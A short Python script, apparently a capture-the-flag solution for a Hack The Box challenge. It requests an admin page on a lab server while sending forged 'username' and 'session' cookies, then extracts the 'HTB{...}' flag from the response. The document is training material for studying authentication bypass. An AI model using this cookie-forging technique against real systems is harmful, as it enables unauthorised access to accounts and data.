import requests 

USERNAME = "noexist"
BASE_URL = "http://94.237.60.55:42213"


resp = requests.get(f"{BASE_URL}/user/admin", cookies={"username":USERNAME, "session": "dummy"})

if not resp.ok:
    print("ERROR!")
    print(resp.status_code)
    print(resp.text)
    exit(1)

flag_start = resp.text.find("HTB{")
flag_end = resp.text.find("}", flag_start)
flag = resp.text[flag_start:flag_end+1]
print(flag) 